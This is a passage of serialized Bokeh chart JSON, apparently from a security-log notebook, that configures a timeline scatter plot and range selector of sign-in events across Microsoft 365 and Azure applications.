ttle\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"CgAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAAAoAAAA=\"},\"shape\":[11],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2995\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2996\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2991\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2992\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2993\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p2667\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"HoverTool\",\"id\":\"p2623\",\"attributes\":{\"renderers\":\"auto\",\"tooltips\":[[\"AppDisplayName\",\"@AppDisplayName\"],[\"UserPrincipalName\",\"@UserPrincipalName\"],[\"Result\",\"@Result\"],[\"IPAddress\",\"@IPAddress\"],[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"]],\"formatters\":{\"type\":\"map\",\"entries\":[[\"@TimeGenerated\",\"datetime\"]]}}},{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p2696\",\"attributes\":{\"dimensions\":\"width\",\"renderers\":\"auto\"}},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p2697\",\"attributes\":{\"dimensions\":\"both\",\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p2698\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5,\"level\":\"overlay\",\"visible\":false,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"top_units\":\"canvas\",\"bottom_units\":\"canvas\",\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p2704\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p2703\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p2705\"},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p2706\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p2707\",\"attributes\":{\"dimensions\":\"width\"}}]}},\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p2691\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p2692\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p2693\"},\"major_label_overrides\":{\"type\":\"map\",\"entries\":[[0,\"Azure Portal\"],[1,\"Microsoft 365 Security and Compliance Center\"],[2,\"Microsoft Cloud App Security\"],[3,\"Microsoft Forms\"],[4,\"Microsoft Stream Portal\"],[5,\"O365 Suite UX\"],[6,\"Office 365 Exchange Online\"],[7,\"Office 365 SharePoint Online\"],[8,\"Office365 Shell WCSS-Client\"],[9,\"SharePoint Online Web Client Extensibility\"],[10,\"Skype Web Experience On Office 365\"]]},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2694\"}}},{\"type\":\"object\",\"name\":\"Legend\",\"id\":\"p2998\",\"attributes\":{\"location\":\"center\",\"click_policy\":\"hide\",\"label_text_font_size\":\"8pt\",\"items\":[{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2997\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Skype Web Experience On Office 365\"},\"renderers\":[{\"id\":\"p2994\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2987\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"SharePoint Online Web Client Extensibility\"},\"renderers\":[{\"id\":\"p2984\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2977\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Office365 Shell WCSS-Client\"},\"renderers\":[{\"id\":\"p2974\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2967\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Office 365 SharePoint Online\"},\"renderers\":[{\"id\":\"p2964\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2957\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Office 365 Exchange Online\"},\"renderers\":[{\"id\":\"p2954\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2947\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"O365 Suite UX\"},\"renderers\":[{\"id\":\"p2944\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2937\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Microsoft Stream Portal\"},\"renderers\":[{\"id\":\"p2934\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2927\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Microsoft Forms\"},\"renderers\":[{\"id\":\"p2924\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2917\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Microsoft Cloud App Security\"},\"renderers\":[{\"id\":\"p2914\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2907\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Microsoft 365 Security and Compliance Center\"},\"renderers\":[{\"id\":\"p2904\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p2897\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"Azure Portal\"},\"renderers\":[{\"id\":\"p2894\"}]}}]}}],\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p2672\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p2673\",\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2674\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2675\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p2676\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2677\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2678\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2679\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p2680\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2681\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2682\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2683\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p2684\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p2685\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p2887\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"axis_label\":\"Event Time\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p2689\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2690\",\"attributes\":{\"axis\":{\"id\":\"p2672\"},\"minor_grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.3}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p2695\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p2691\"},\"grid_line_color\":null}}],\"min_border_left\":50}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2742\",\"attributes\":{\"width\":900,\"height\":120,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2752\",\"attributes\":{\"start\":1755236755796.833,\"end\":1755296475685.633}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p2744\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2753\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2754\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2745\",\"attributes\":{\"text\":\"Range Selector\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2782\",\"attributes\":{\"data_source\":{\"id\":\"p2590\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2783\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2784\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2779\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2780\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2781\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2791\",\"attributes\":{\"data_source\":{\"id\":\"p2593\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2792\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2793\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2788\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2789\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2790\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#481E70\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2800\",\"attributes\":{\"data_source\":{\"id\":\"p2596\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2801\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2802\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2797\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2798\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2799\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2809\",\"attributes\":{\"data_source\":{\"id\":\"p2599\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2810\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2811\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2806\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2807\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2808\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#3B518A\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2818\",\"attributes\":{\"data_source\":{\"id\":\"p2602\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2819\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2820\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2815\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2816\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2817\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2827\",\"attributes\":{\"data_source\":{\"id\":\"p2605\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2828\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2829\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2824\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2825\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2826\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#287B8E\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2836\",\"attributes\":{\"data_source\":{\"id\":\"p2608\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2837\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2838\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2833\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2834\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2835\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2845\",\"attributes\":{\"data_source\":{\"id\":\"p2611\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2846\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2847\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2842\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2843\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2844\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#1FA386\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2854\",\"attributes\":{\"data_source\":{\"id\":\"p2614\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2855\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2856\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2851\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p2852\",\"attributes\":{\"x\"